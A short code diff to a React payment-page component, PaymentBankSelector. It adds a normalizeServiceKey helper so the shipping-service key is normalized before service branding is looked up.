@@ -6,7 +6,7 @@ import { Badge } from "@/components/ui/badge";
 import { useLink } from "@/hooks/useSupabase";
 import { Building2, ArrowLeft, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getServiceBranding, normalizeServiceKey } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 
@@ -28,8 +28,9 @@ const PaymentBankSelector = () => {
   const preselectedBank = linkData?.payload?.selected_bank;
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const rawServiceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || rawServiceKey;
+  const serviceKey = normalizeServiceKey(rawServiceKey, serviceName);
   const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
